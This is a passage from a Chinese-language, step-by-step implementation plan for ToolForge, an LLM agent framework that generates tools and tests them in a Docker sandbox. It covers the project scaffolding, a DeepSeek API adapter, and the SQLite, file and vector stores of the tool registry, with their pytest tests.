# ToolForge Phase 1 实施计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 构建 ToolForge Phase 1 — 跑通核心闭环（感知缺失 → 生成工具 → Docker 沙盒验证 → 入库 → 复用）

**Architecture:** 四模块分层架构。Master Agent 负责编排和工具缺失感知；Tool Smith 负责模板匹配与 LLM 代码生成；Sandbox 负责 Docker 隔离验证；Tool Registry 负责三层存储（文件 + SQLite + ChromaDB）。所有模块通过 `asyncio` 异步接口通信。

**Tech Stack:** Python 3.12+, DeepSeek V4 Pro API, Docker (docker-py), ChromaDB, SQLite, Pydantic, pytest

---

## 文件结构总览

```
toolforge/
├── __init__.py
├── cli.py                          # CLI 入口（Task 16）
├── config.py                       # 配置管理（Task 1）
├── exceptions.py                   # 自定义异常（Task 1）
├── llm/
│   ├── __init__.py
│   ├── base.py                     # LLM 适配器抽象接口（Task 2）
│   └── deepseek.py                 # DeepSeek 适配器（Task 2）
├── registry/
│   ├── __init__.py
│   ├── models.py                   # 数据模型（Task 3）
│   ├── file_store.py               # 文件存储层（Task 3）
│   ├── db_store.py                 # SQLite 管理层（Task 4）
│   ├── vector_store.py             # ChromaDB 向量层（Task 5）
│   └── registry.py                 # 统一接口（Task 6）
├── sandbox/
│   ├── __init__.py
│   ├── docker_manager.py           # Docker 容器管理（Task 7）
│   ├── image_builder.py            # 镜像构建（Task 7）
│   └── test_runner.py              # 容器内测试执行器（Task 8）
├── smith/
│   ├── __init__.py
│   ├── models.py                   # 生成产物数据模型（Task 9）
│   ├── static_checker.py           # AST 静态安全检查（Task 9）
│   ├── template_engine.py          # 模板匹配与填充（Task 10）
│   ├── code_generator.py           # LLM 自由生成（Task 11）
│   └── smith.py                    # Tool Smith 统一接口（Task 12）
├── master/
│   ├── __init__.py
│   ├── planner.py                  # 任务分解（Task 13）
│   ├── tool_sensor.py              # 工具缺失感知（Task 14）
│   └── agent.py                    # Master Agent 主循环（Task 15）
├── templates/                      # 预置工具模板（Task 18）
│   ├── api_caller/
│   │   ├── template.yaml
│   │   ├── tool_template.py
│   │   └── test_template.py
│   ├── file_parser/
│   ├── text_processor/
│   ├── data_transformer/
│   ├── data_extractor/
│   ├── format_converter/
│   ├── calculator/
│   └── system_command/
├── tools/                          # 内置工具（Task 17）
│   └── builtin/
│       ├── file_reader/
│       │   ├── tool.py
│       │   ├── test_tool.py
│       │   └── meta.yaml
│       └── echo/
└── tests/
    ├── __init__.py
    ├── conftest.py                 # 共享 fixtures（Task 1）
    ├── test_llm/
    │   └── test_deepseek.py
    ├── test_registry/
    │   ├── test_file_store.py
    │   ├── test_db_store.py
    │   ├── test_vector_store.py
    │   └── test_registry.py
    ├── test_sandbox/
    │   └── test_docker_manager.py
    ├── test_smith/
    │   ├── test_static_checker.py
    │   ├── test_template_engine.py
    │   ├── test_code_generator.py
    │   └── test_smith.py
    ├── test_master/
    │   ├── test_planner.py
    │   ├── test_tool_sensor.py
    │   └── test_agent.py
    └── test_integration/
        └── test_full_loop.py
```

---

### Task 1: 项目基础搭建

**Files:**
- Create: `toolforge/__init__.py`
- Create: `toolforge/config.py`
- Create: `toolforge/exceptions.py`
- Create: `pyproject.toml`
- Create: `config.yaml`
- Create: `tests/__init__.py`
- Create: `tests/conftest.py`
- Create: `.gitignore`

- [ ] **Step 1: 创建 pyproject.toml**

```toml
[project]
name = "toolforge"
version = "0.1.0"
description = "自进化工具 AI Agent 框架"
requires-python = ">=3.12"
dependencies = [
    "pydantic>=2.0",
    "pydantic-settings>=2.0",
    "pyyaml>=6.0",
    "httpx>=0.27",
    "chromadb>=0.5",
    "docker>=7.0",
    "jinja2>=3.1",
    "aiosqlite>=0.20",
]

[project.optional-dependencies]
dev = [
    "pytest>=8.0",
    "pytest-asyncio>=0.23",
    "pytest-mock>=3.12",
]

[build-system]
requires = ["setuptools>=75"]
build-backend = "setuptools.build_meta"
```

- [ ] **Step 2: 创建 .gitignore**

```
__pycache__/
*.pyc
.venv/
.env
data/
*.egg-info/
dist/
.pytest_cache/
```

- [ ] **Step 3: 创建 config.py**

```python
"""ToolForge 配置管理。"""
from pathlib import Path
from pydantic import Field
from pydantic_settings import BaseSettings, SettingsConfigDict


class LLMConfig(BaseSettings):
    model_config = SettingsConfigDict(env_prefix="TOOLFORGE_LLM_")
    provider: str = "deepseek"
    api_key: str = ""
    model: str = "deepseek-v4-pro"
    base_url: str = "https://api.deepseek.com/v1"
    max_retries: int = 3
    timeout: int = 60


class SandboxConfig(BaseSettings):
    model_config = SettingsConfigDict(env_prefix="TOOLFORGE_SANDBOX_")
    memory_limit_mb: int = 256
    cpu_limit: float = 1.0
    timeout_seconds: int = 30
    pids_limit: int = 50
    base_image: str = "python:3.12-slim"


class SmithConfig(BaseSettings):
    model_config = SettingsConfigDict(env_prefix="TOOLFORGE_SMITH_")
    template_match_threshold: float = 0.7
    max_fix_attempts: int = 2


class RegistryConfig(BaseSettings):
    model_config = SettingsConfigDict(env_prefix="TOOLFORGE_REGISTRY_")
    db_path: str = "./data/toolforge.db"
    vector_path: str = "./data/chromadb"
    tools_path: str = "./tool_registry"


class SecurityConfig(BaseSettings):
    model_config = SettingsConfigDict(env_prefix="TOOLFORGE_SECURITY_")
    human_approval_mode: bool = False
    max_inventions_per_task: int = 5
    rate_limit_per_tool: int = 50


class Config(BaseSettings):
    model_config = SettingsConfigDict(env_prefix="TOOLFORGE_")
    llm: LLMConfig = Field(default_factory=LLMConfig)
    sandbox: SandboxConfig = Field(default_factory=SandboxConfig)
    smith: SmithConfig = Field(default_factory=SmithConfig)
    registry: RegistryConfig = Field(default_factory=RegistryConfig)
    security: SecurityConfig = Field(default_factory=SecurityConfig)

    @classmethod
    def from_yaml(cls, path: str | Path) -> "Config":
        import yaml
        with open(path) as f:
            data = yaml.safe_load(f) or {}
        return cls(**data)


_config: Config | None = None


def get_config() -> Config:
    global _config
    if _config is None:
        _config = Config()
    return _config


def init_config(config_or_path: Config | str | Path) -> Config:
    global _config
    if isinstance(config_or_path, Config):
        _config = config_or_path
    else:
        _config = Config.from_yaml(config_or_path)
    return _config
```

- [ ] **Step 4: 创建 exceptions.py**

```python
"""ToolForge 自定义异常。"""


class ToolForgeError(Exception):
    """ToolForge 基础异常。"""


class ToolNotFoundError(ToolForgeError):
    """工具库中未找到匹配工具。"""


class ToolGenerationError(ToolForgeError):
    """Tool Smith 生成工具失败。"""


class StaticCheckError(ToolForgeError):
    """静态安全检查未通过。"""
    def __init__(self, message: str, violations: list[str]):
        super().__init__(message)
        self.violations = violations


class SandboxError(ToolForgeError):
    """沙盒执行异常。"""
    def __init__(self, message: str, exit_code: int | None = None, stderr: str = ""):
        super().__init__(message)
        self.exit_code = exit_code
        self.stderr = stderr


class SandboxTimeoutError(SandboxError):
    """沙盒执行超时。"""


class ConfigError(ToolForgeError):
    """配置错误。"""


class LLMError(ToolForgeError):
    """LLM API 调用失败。"""
```

- [ ] **Step 5: 创建 tests/conftest.py**

```python
"""共享测试 fixtures。"""
import pytest
import tempfile
import shutil
from pathlib import Path


@pytest.fixture
def temp_dir():
    """创建临时目录，测试后自动清理。"""
    d = tempfile.mkdtemp()
    yield Path(d)
    shutil.rmtree(d, ignore_errors=True)


@pytest.fixture
def sample_config():
    """返回用于测试的配置字典。"""
    return {
        "llm": {
            "provider": "deepseek",
            "api_key": "test-key",
            "model": "deepseek-v4-pro",
            "base_url": "https://api.deepseek.com/v1",
        },
        "sandbox": {
            "memory_limit_mb": 128,
            "timeout_seconds": 10,
        },
        "smith": {
            "template_match_threshold": 0.7,
            "max_fix_attempts": 2,
        },
        "registry": {
            "db_path": ":memory:",
            "tools_path": "/tmp/test_tools",
        },
        "security": {
            "human_approval_mode": False,
            "max_inventions_per_task": 3,
            "rate_limit_per_tool": 50,
        },
    }
```

- [ ] **Step 6: 创建 toolforge/__init__.py**

```python
"""ToolForge — 自进化工具 AI Agent 框架。"""
__version__ = "0.1.0"
```

- [ ] **Step 7: 创建 config.yaml**

```yaml
llm:
  provider: deepseek
  api_key: ${DEEPSEEK_API_KEY}
  model: deepseek-v4-pro
  base_url: https://api.deepseek.com/v1
  max_retries: 3
  timeout: 60

sandbox:
  memory_limit_mb: 256
  cpu_limit: 1
  timeout_seconds: 30
  pids_limit: 50
  base_image: "python:3.12-slim"

smith:
  template_match_threshold: 0.7
  max_fix_attempts: 2

registry:
  db_path: ./data/toolforge.db
  vector_path: ./data/chromadb
  tools_path: ./tool_registry

security:
  human_approval_mode: false
  max_inventions_per_task: 5
  rate_limit_per_tool: 50
```

- [ ] **Step 8: 安装依赖并验证**

Run: `pip install -e ".[dev]"`
Expected: 所有依赖安装成功

- [ ] **Step 9: 验证项目可导入**

Run: `python -c "from toolforge.config import Config; c = Config(); print(c.llm.provider)"`
Expected: `deepseek`

- [ ] **Step 10: Commit**

```bash
git add -A
git commit -m "chore: project scaffold with config, exceptions, and dependencies"
```

---

### Task 2: LLM 适配器层

**Files:**
- Create: `toolforge/llm/__init__.py`
- Create: `toolforge/llm/base.py`
- Create: `toolforge/llm/deepseek.py`
- Create: `tests/test_llm/__init__.py`
- Create: `tests/test_llm/test_deepseek.py`

- [ ] **Step 1: 创建 LLM 适配器抽象接口**

```python
# toolforge/llm/base.py
"""LLM 适配器抽象接口。"""
from abc import ABC, abstractmethod
from typing import Any


class LLMAdapter(ABC):
    """LLM 适配器抽象基类。"""

    def __init__(self, model: str, api_key: str, base_url: str, timeout: int = 60):
        self.model = model
        self.api_key = api_key
        self.base_url = base_url
        self.timeout = timeout

    @abstractmethod
    async def chat(
        self,
        messages: list[dict[str, Any]],
        tools: list[dict[str, Any]] | None = None,
        tool_choice: str | None = None,
        temperature: float = 0.7,
        max_tokens: int = 4096,
    ) -> dict[str, Any]:
        """发送对话请求，返回完整响应。"""

    @abstractmethod
    async def generate_structured(
        self,
        system_prompt: str,
        user_prompt: str,
        output_schema: dict[str, Any],
        temperature: float = 0.3,
    ) -> dict[str, Any]:
        """生成结构化输出，LLM 必须按 schema 返回 JSON。"""


def create_adapter(provider: str, **kwargs) -> LLMAdapter:
    """工厂函数：根据 provider 创建对应适配器。"""
    if provider == "deepseek":
        from toolforge.llm.deepseek import DeepSeekAdapter
        return DeepSeekAdapter(**kwargs)
    raise ValueError(f"Unsupported LLM provider: {provider}")
```

- [ ] **Step 2: 为 DeepSeekAdapter 编写失败测试**

```python
# tests/test_llm/test_deepseek.py
import pytest
from toolforge.llm.deepseek import DeepSeekAdapter


def test_deepseek_adapter_initialization():
    adapter = DeepSeekAdapter(
        model="deepseek-v4-pro",
        api_key="test-key",
        base_url="https://api.deepseek.com/v1",
    )
    assert adapter.model == "deepseek-v4-pro"
    assert adapter.api_key == "test-key"
```

Run: `pytest tests/test_llm/test_deepseek.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'toolforge.llm.deepseek'`

- [ ] **Step 3: 实现 DeepSeekAdapter**

```python
# toolforge/llm/deepseek.py
"""DeepSeek API 适配器。"""
import json
import httpx
from typing import Any
from toolforge.llm.base import LLMAdapter
from toolforge.exceptions import LLMError


class DeepSeekAdapter(LLMAdapter):
    """DeepSeek V4 Pro API 适配器（兼容 OpenAI 格式）。"""

    async def chat(
        self,
        messages: list[dict[str, Any]],
        tools: list[dict[str, Any]] | None = None,
        tool_choice: str | None = None,
        temperature: float = 0.7,
        max_tokens: int = 4096,
    ) -> dict[str, Any]:
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json",
        }
        body: dict[str, Any] = {
            "model": self.model,
            "messages": messages,
            "temperature": temperature,
            "max_tokens": max_tokens,
        }
        if tools:
            body["tools"] = tools
        if tool_choice:
            body["tool_choice"] = tool_choice

        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for attempt in range(3):
                try:
                    resp = await client.post(
                        f"{self.base_url}/chat/completions",
                        headers=headers,
                        json=body,
                    )
                    resp.raise_for_status()
                    return resp.json()
                except httpx.HTTPStatusError as e:
                    if attempt == 2:
                        raise LLMError(
                            f"DeepSeek API error after 3 retries: {e.response.text}"
                        )
                    await _backoff(attempt)
                except httpx.RequestError as e:
                    if attempt == 2:
                        raise LLMError(f"DeepSeek connection error: {e}")
                    await _backoff(attempt)

    async def generate_structured(
        self,
        system_prompt: str,
        user_prompt: str,
        output_schema: dict[str, Any],
        temperature: float = 0.3,
    ) -> dict[str, Any]:
        schema_str = json.dumps(output_schema, ensure_ascii=False)
        messages = [
            {"role": "system", "content": system_prompt},
            {
                "role": "user",
                "content": (
                    f"{user_prompt}\n\n"
                    f"你必须严格按照以下 JSON schema 返回，只返回 JSON，不要包含其他文字：\n"
                    f"{schema_str}"
                ),
            },
        ]
        response = await self.chat(
            messages=messages,
            temperature=temperature,
            max_tokens=4096,
        )
        content = response["choices"][0]["message"]["content"]
        # 清理 markdown 代码块包裹
        content = _strip_json_fence(content)
        try:
            return json.loads(content)
        except json.JSONDecodeError as e:
            raise LLMError(f"Failed to parse structured output as JSON: {e}")


def _backoff(attempt: int) -> Any:
    import asyncio
    return asyncio.sleep(2 ** attempt)


def _strip_json_fence(text: str) -> str:
    """移除 ```json ... ``` 包裹。"""
    text = text.strip()
    if text.startswith("```"):
        lines = text.split("\n")
        if lines[0].startswith("```"):
            lines = lines[1:]
        if lines and lines[-1].strip() == "```":
            lines = lines[:-1]
        text = "\n".join(lines)
    return text.strip()
```

- [ ] **Step 4: 运行测试验证通过**

Run: `pytest tests/test_llm/test_deepseek.py -v`
Expected: PASS

- [ ] **Step 5: 补充 mock API 调用的集成测试**

```python
# 追加到 tests/test_llm/test_deepseek.py

@pytest.mark.asyncio
async def test_chat_makes_correct_api_call(mocker):
    import httpx
    mock_post = mocker.patch("httpx.AsyncClient.post")
    mock_response = mocker.MagicMock()
    mock_response.json.return_value = {
        "choices": [{"message": {"content": "你好"}}]
    }
    mock_response.raise_for_status.return_value = None
    mock_post.return_value = mock_response

    adapter = DeepSeekAdapter(
        model="deepseek-v4-pro",
        api_key="test-key",
        base_url="https://api.deepseek.com/v1",
    )
    result = await adapter.chat([{"role": "user", "content": "你好"}])
    assert result["choices"][0]["message"]["content"] == "你好"


@pytest.mark.asyncio
async def test_generate_structured_parses_json(mocker):
    import httpx
    mock_post = mocker.patch("httpx.AsyncClient.post")
    mock_response = mocker.MagicMock()
    mock_response.json.return_value = {
        "choices": [{"message": {"content": '{"key": "value"}'}}]
    }
    mock_response.raise_for_status.return_value = None
    mock_post.return_value = mock_response

    adapter = DeepSeekAdapter(
        model="deepseek-v4-pro",
        api_key="test-key",
        base_url="https://api.deepseek.com/v1",
    )
    result = await adapter.generate_structured(
        "system", "user", {"type": "object", "properties": {"key": {"type": "string"}}}
    )
    assert result == {"key": "value"}
```

Run: `pytest tests/test_llm/test_deepseek.py -v`
Expected: PASS (3 tests)

- [ ] **Step 6: Commit**

```bash
git add toolforge/llm/ tests/test_llm/
git commit -m "feat: add LLM adapter layer with DeepSeek support"
```

---

### Task 3: Tool Registry — 数据模型与文件存储

**Files:**
- Create: `toolforge/registry/__init__.py`
- Create: `toolforge/registry/models.py`
- Create: `toolforge/registry/file_store.py`
- Create: `tests/test_registry/__init__.py`
- Create: `tests/test_registry/test_file_store.py`

- [ ] **Step 1: 创建数据模型**

```python
# toolforge/registry/models.py
"""Tool Registry 数据模型。"""
from enum import Enum
from datetime import datetime
from pydantic import BaseModel, Field
import uuid


class ToolSource(str, Enum):
    BUILTIN = "builtin"
    AUTO = "auto"
    VERIFIED = "verified"
    SUSPICIOUS = "suspicious"


class ToolStatus(str, Enum):
    ACTIVE = "active"
    DEPRECATED = "deprecated"
    SUSPICIOUS = "suspicious"


class ToolMeta(BaseModel):
    """工具元数据。"""
    name: str
    version: str = "0.1.0"
    description: str
    category: str
    source: ToolSource = ToolSource.AUTO
    status: ToolStatus = ToolStatus.ACTIVE
    dependencies: list[str] = Field(default_factory=list)
    usage_example: str = ""
    created_at: datetime = Field(default_factory=datetime.now)
    updated_at: datetime = Field(default_factory=datetime.now)


class ToolRecord(BaseModel):
    """完整的工具记录，包含元数据、代码和测试代码。"""
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    meta: ToolMeta
    code: str
    test_code: str

    @property
    def name(self) -> str:
        return self.meta.name

    @property
    def category(self) -> str:
        return self.meta.category

    @property
    def source(self) -> ToolSource:
        return self.meta.source


class ExecutionRecord(BaseModel):
    """工具调用记录。"""
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    tool_id: str
    task_id: str = ""
    success: bool
    execution_time_ms: int = 0
    sandbox_id: str = ""
    error_message: str = ""
    created_at: datetime = Field(default_factory=datetime.now)
```

- [ ] **Step 2: 为 FileStore 编写失败测试**

```python
# tests/test_registry/test_file_store.py
import pytest
from toolforge.registry.file_store import FileStore
from toolforge.registry.models import ToolMeta, ToolRecord, ToolSource


def test_save_and_load_tool(temp_dir):
    store = FileStore(str(temp_dir))
    record = ToolRecord(
        meta=ToolMeta(
            name="hello_world",
            description="A hello world tool",
            category="test",
            source=ToolSource.AUTO,
        ),
        code="def hello():\n    return 'hello'",
        test_code="def test_hello():\n    assert hello() == 'hello'",
    )
    store.save(record)

    loaded = store.load("hello_world")
    assert loaded.name == "hello_world"
    assert loaded.code == "def hello():\n    return 'hello'"
    assert loaded.test_code == "def test_hello():\n    assert hello() == 'hello'"


def test_load_nonexistent_tool(temp_dir):
    store = FileStore(str(temp_dir))
    with pytest.raises(FileNotFoundError):
        store.load("nonexistent")


def test_list_tools_by_category(temp_dir):
    store = FileStore(str(temp_dir))
    for i in range(3):
        record = ToolRecord(
            meta=ToolMeta(
                name=f"tool_{i}",
                description=f"Tool {i}",
                category="test_cat",
                source=ToolSource.AUTO,
            ),
            code=f"def tool_{i}(): pass",
            test_code=f"def test_tool_{i}(): pass",
        )
        store.save(record)

    names = store.list_tools(category="test_cat")
    assert len(names) == 3
    assert "tool_0" in names
```

Run: `pytest tests/test_registry/test_file_store.py -v`
Expected: FAIL — `ModuleNotFoundError`

- [ ] **Step 3: 实现 FileStore**

```python
# toolforge/registry/file_store.py
"""文件存储层 — 以文件系统为代码权威载体。"""
import json
import shutil
from pathlib import Path
from toolforge.registry.models import ToolMeta, ToolRecord


class FileStore:
    """按 category/name 组织工具文件的存储。"""

    def __init__(self, root: str):
        self.root = Path(root)
        self.root.mkdir(parents=True, exist_ok=True)

    def _tool_dir(self, category: str, name: str) -> Path:
        return self.root / category / name

    def save(self, record: ToolRecord) -> Path:
        """保存工具到文件系统。返回工具目录路径。"""
        tool_dir = self._tool_dir(record.category, record.name)
        versions_dir = tool_dir / "versions"
        tool_dir.mkdir(parents=True, exist_ok=True)
        versions_dir.mkdir(exist_ok=True)

        # 保存代码
        (tool_dir / "tool.py").write_text(record.code, encoding="utf-8")
        # 保存测试代码
        (tool_dir / "test_tool.py").write_text(record.test_code, encoding="utf-8")
        # 保存元数据
        meta_dict = record.meta.model_dump(mode="json")
        (tool_dir / "meta.yaml").write_text(_to_yaml(meta_dict), encoding="utf-8")

        return tool_dir

    def load(self, name: str, category: str | None = None) -> ToolRecord:
        """加载工具。如果未指定 category，遍历所有分类查找。"""
        if category:
            return self._load_from_dir(self._tool_dir(category, name))
        return self._search_and_load(name)

    def _search_and_load(self, name: str) -> ToolRecord:
        for tool_dir in self.root.rglob(name):
            if tool_dir.is_dir():
                return self._load_from_dir(tool_dir)
        raise FileNotFoundError(f"Tool not found: {name}")

    def _load_from_dir(self, tool_dir: Path) -> ToolRecord:
        if not tool_dir.exists():
            raise FileNotFoundError(f"Tool directory not found: {tool_dir}")
        code = (tool_dir / "tool.py").read_text(encoding="utf-8")
        test_code = (tool_dir / "test_tool.py").read_text(encoding="utf-8")
        meta_dict = _from_yaml((tool_dir / "meta.yaml").read_text(encoding="utf-8"))
        return ToolRecord(
            meta=ToolMeta(**meta_dict),
            code=code,
            test_code=test_code,
        )

    def list_tools(self, category: str | None = None) -> list[str]:
        """列出所有工具名。"""
        names = []
        search_dir = self.root / category if category else self.root
        if not search_dir.exists():
            return []
        for tool_dir in search_dir.rglob("meta.yaml"):
            name = tool_dir.parent.name
            if name != "versions":
                names.append(name)
        return sorted(names)

    def delete(self, name: str, category: str) -> None:
        """删除工具。"""
        tool_dir = self._tool_dir(category, name)
        if tool_dir.exists():
            shutil.rmtree(tool_dir)


def _to_yaml(data: dict) -> str:
    import yaml
    return yaml.dump(data, default_flow_style=False, allow_unicode=True)


def _from_yaml(text: str) -> dict:
    import yaml
    return yaml.safe_load(text)
```

- [ ] **Step 4: 运行测试验证**

Run: `pytest tests/test_registry/test_file_store.py -v`
Expected: PASS (3 tests)

- [ ] **Step 5: Commit**

```bash
git add toolforge/registry/__init__.py toolforge/registry/models.py toolforge/registry/file_store.py tests/test_registry/
git commit -m "feat: add Tool Registry models and file store layer"
```

---

### Task 4: Tool Registry — SQLite 管理层

**Files:**
- Create: `toolforge/registry/db_store.py`
- Create: `tests/test_registry/test_db_store.py`

- [ ] **Step 1: 为 DBStore 编写失败测试**

```python
# tests/test_registry/test_db_store.py
import pytest
from toolforge.registry.db_store import DBStore
from toolforge.registry.models import ToolMeta, ToolRecord, ToolSource, ExecutionRecord


@pytest.fixture
async def db(temp_dir):
    db_path = str(temp_dir / "test.db")
    store = DBStore(db_path)
    await store.initialize()
    yield store
    await store.close()


@pytest.mark.asyncio
async def test_initialize_creates_tables(db):
    tables = await db._list_tables()
    assert "tools" in tables
    assert "executions" in tables
    assert "security_log" in tables


@pytest.mark.asyncio
async def test_insert_and_get_tool(db):
    record = ToolRecord(
        meta=ToolMeta(
            name="test_tool",
            description="A test tool",
            category="test",
            source=ToolSource.AUTO,
        ),
        code="def f(): pass",
        test_code="def test_f(): pass",
    )
    await db.insert_tool(record)
    result = await db.get_tool(record.id)
    assert result is not None
    assert result.name == "test_tool"


@pytest.mark.asyncio
async def test_search_tools_by_category(db):
    for i in range(3):
        record = ToolRecord(
            meta=ToolMeta(
                name=f"tool_{i}",
                description=f"Tool {i}",
                category="api",
                source=ToolSource.AUTO,
            ),
            code=f"def tool_{i}(): pass",
            test_code=f"def test_tool_{i}(): pass",
        )
        await db.insert_tool(record)

    results = await db.search_tools(category="api")
    assert len(results) == 3


@pytest.mark.asyncio
async def test_log_execution(db):
    record = ToolRecord(
        meta=ToolMeta(name="test", description="test", category="test"),
        code="code",
        test_code="test",
    )
    await db.insert_tool(record)

    exec_record = ExecutionRecord(
        tool_id=record.id,
        task_id="task_1",
        success=True,
        execution_time_ms=150,
    )
    await db.log_execution(exec_record)

    stats = await db.get_tool_stats(record.id)
    assert stats["total_calls"] == 1
    assert stats["success_rate"] == 1.0
```

Run: `pytest tests/test_registry/test_db_store.py -v`
Expected: FAIL — `ModuleNotFoundError`

- [ ] **Step 2: 实现 DBStore**

```python
# toolforge/registry/db_store.py
"""SQLite 管理层 — 元数据查询、调用统计、安全审计。"""
import json
import aiosqlite
from pathlib import Path
from toolforge.registry.models import ToolMeta, ToolRecord, ToolSource, ToolStatus, ExecutionRecord


class DBStore:
    def __init__(self, db_path: str):
        self.db_path = db_path
        self._conn: aiosqlite.Connection | None = None

    async def initialize(self):
        Path(self.db_path).parent.mkdir(parents=True, exist_ok=True)
        self._conn = await aiosqlite.connect(self.db_path)
        self._conn.row_factory = aiosqlite.Row
        await self._conn.executescript("""
            CREATE TABLE IF NOT EXISTS tools (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL UNIQUE,
                version TEXT NOT NULL DEFAULT '0.1.0',
                description TEXT NOT NULL,
                category TEXT NOT NULL,
                source TEXT NOT NULL DEFAULT 'auto',
                status TEXT NOT NULL DEFAULT 'active',
                dependencies TEXT NOT NULL DEFAULT '[]',
                usage_example TEXT NOT NULL DEFAULT '',
                embedding_id TEXT,
                created_at TEXT NOT NULL,
                updated_at TEXT NOT NULL
            );

            CREATE TABLE IF NOT EXISTS executions (
                id TEXT PRIMARY KEY,
                tool_id TEXT NOT NULL REFERENCES tools(id),
                task_id TEXT NOT NULL DEFAULT '',
                success INTEGER NOT NULL DEFAULT 1,
                execution_time_ms INTEGER NOT NULL DEFAULT 0,
                sandbox_id TEXT NOT NULL DEFAULT '',
                error_message TEXT NOT NULL DEFAULT '',
                created_at TEXT NOT NULL
            );

            CREATE TABLE IF NOT EXISTS security_log (
                id TEXT PRIMARY KEY,
                tool_id TEXT REFERENCES tools(id),
                event_type TEXT NOT NULL,
                detail TEXT NOT NULL DEFAULT '',
                created_at TEXT NOT NULL
            );
        """)
        await self._conn.commit()

    async def close(self):
        if self._conn:
            await self._conn.close()

    async def _list_tables(self) -> list[str]:
        cursor = await self._conn.execute(
            "SELECT name FROM sqlite_master WHERE type='table'"
        )
        return [row[0] for row in await cursor.fetchall()]

    async def insert_tool(self, record: ToolRecord) -> None:
        await self._conn.execute(
            """INSERT OR REPLACE INTO tools
               (id, name, version, description, category, source, status,
                dependencies, usage_example, created_at, updated_at)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                record.id,
                record.name,
                record.meta.version,
                record.meta.description,
                record.category,
                record.source.value,
                record.meta.status.value,
                json.dumps(record.meta.dependencies),
                record.meta.usage_example,
                record.meta.created_at.isoformat(),
                record.meta.updated_at.isoformat(),
            ),
        )
        await self._conn.commit()

    async def get_tool(self, tool_id: str) -> dict | None:
        cursor = await self._conn.execute("SELECT * FROM tools WHERE id = ?", (tool_id,))
        row = await cursor.fetchone()
        return dict(row) if row else None

    async def get_tool_by_name(self, name: str) -> dict | None:
        cursor = await self._conn.execute("SELECT * FROM tools WHERE name = ?", (name,))
        row = await cursor.fetchone()
        return dict(row) if row else None

    async def search_tools(
        self,
        category: str | None = None,
        source: ToolSource | None = None,
        status: ToolStatus | None = None,
    ) -> list[dict]:
        query = "SELECT * FROM tools WHERE 1=1"
        params: list = []
        if category:
            query += " AND category = ?"
            params.append(category)
        if source:
            query += " AND source = ?"
            params.append(source.value)
        if status:
            query += " AND status = ?"
            params.append(status.value)
        else:
            query += " AND status = 'active'"
        cursor = await self._conn.execute(query, params)
        return [dict(row) for row in await cursor.fetchall()]

    async def update_tool_status(self, tool_id: str, status: ToolStatus) -> None:
        await self._conn.execute(
            "UPDATE tools SET status = ? WHERE id = ?",
            (status.value, tool_id),
        )
        await self._conn.commit()

    async def log_execution(self, record: ExecutionRecord) -> None:
        await self._conn.execute(
            """INSERT INTO executions (id, tool_id, task_id, success,
               execution_time_ms, sandbox_id, error_message, created_at)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                record.id,
                record.tool_id,
                record.task_id,
                1 if record.success else 0,
                record.execution_time_ms,
                record.sandbox_id,
                record.error_message,
                record.created_at.isoformat(),
            ),
        )
        await self._conn.commit()

    async def get_tool_stats(self, tool_id: str) -> dict:
        cursor = await self._conn.execute(
            "SELECT COUNT(*) as total, "
            "SUM(CASE WHEN success THEN 1 ELSE 0 END) as successes "
            "FROM executions WHERE tool_id = ?",
            (tool_id,),
        )
        row = await cursor.fetchone()
        total = row["total"] or 0
        successes = row["successes"] or 0
        return {
            "total_calls": total,
            "success_rate": successes / total if total > 0 else 0.0,
        }

    async def log_security_event(self, tool_id: str, event_type: str, detail: str) -> None:
        import uuid
        from datetime import datetime
        await self._conn.execute(
            "INSERT INTO security_log (id, tool_id, event_type, detail, created_at) VALUES (?, ?, ?, ?, ?)",
            (str(uuid.uuid4()), tool_id, event_type, detail, datetime.now().isoformat()),
        )
        await self._conn.commit()
```

- [ ] **Step 3: 运行测试验证**

Run: `pytest tests/test_registry/test_db_store.py -v`
Expected: PASS (4 tests)

- [ ] **Step 4: Commit**

```bash
git add toolforge/registry/db_store.py tests/test_registry/test_db_store.py
git commit -m "feat: add SQLite-based DB store for tool metadata and execution tracking"
```

---

### Task 5: Tool Registry — ChromaDB 向量层

**Files:**
- Create: `toolforge/registry/vector_store.py`
- Create: `tests/test_registry/test_vector_store.py`

- [ ] **Step 1: 为 VectorStore 编写失败测试**

```python
# tests/test_registry/test_vector_store.py
import pytest
from toolforge.registry.vector_store import VectorStore


@pytest.fixture
def vector_store(temp_dir):
    return VectorStore(str(temp_dir / "chromadb"))


def test_add_and_search(vector_store):
    vector_store.add(
        tool_id="tool_1",
        name="http_get",
        description="发送HTTP GET请求获取网页内容",
        category="data_fetching",
    )
    vector_store.add(
        tool_id="tool_2",
        name="pdf_parser",
        description="解析PDF文件并提取文本内容",
        category="document_processing",
    )

    results = vector_store.search("下载网页", top_k=2)
    assert len(results) > 0
    # http_get 应该排在最前面
    assert results[0]["name"] == "http_get"


def test_delete_tool(vector_store):
    vector_store.add(
        tool_id="temp_tool",
        name="temp",
        description="Temporary tool",
        category="test",
    )
    vector_store.delete("temp_tool")
    results = vector_store.search("temp", top_k=5)
    # 已删除的工具不应出现在结果中
    assert not any(r["name"] == "temp" for r in results)


def test_search_returns_empty_for_no_match(vector_store):
    results = vector_store.search("完全不相关的查询xyz123", top_k=5)
    # 空库应返回空列表
    assert results == []
```

Run: `pytest tests/test_registry/test_vector_store.py -v`
Expected: FAIL — `ModuleNotFoundError`

- [ ] **Step 2: 实现 VectorStore**

```python
# toolforge/registry/vector_store.py
"""ChromaDB 向量层 — 工具语义检索。"""
import chromadb
from chromadb.config import Settings


class VectorStore:
    def __init__(self, persist_path: str):
        self._client = chromadb.PersistentClient(
            path=persist_path,
            settings=Settings(anonymized_telemetry=False),
        )
        self._collection = self._client.get_or_create_collection(
            name="toolforge_tools",
            metadata={"hnsw:space": "cosine"},
        )

    def add(
        self,
        tool_id: str,
        name: str,
        description: str,
        category: str,
    ) -> None:
        """将工具描述向量化并存储。"""
        self._collection.upsert(
